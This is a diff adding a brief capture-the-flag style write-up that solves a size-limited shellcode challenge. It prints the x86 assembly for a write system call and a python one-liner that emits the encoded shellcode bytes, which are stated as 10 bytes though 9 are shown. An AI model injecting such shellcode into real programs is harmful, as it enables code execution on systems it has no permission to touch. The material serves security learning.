@@ -1,0 +1,12 @@
+In this we had to provide a 10 shellcode to print the contents of the file. The program loaded the contents of the file on the stack and started
+executing the shellcode. Since the size of the shellcode was limited the only thing we could do is make a call to a function, but even that would
+be more than 10 bytes hence we did a system call to write which had a code of 10 bytes exactly. 
+
+The shellcode that we used:-
+mov eax,4
+mov ecx,esi
+int 0x80
+
+The corresponding python code for txt generation:-
+python -c 'print ("\xb8\x04\x00\x00\x00\x89\xf1\xcd\x80")' > input
+
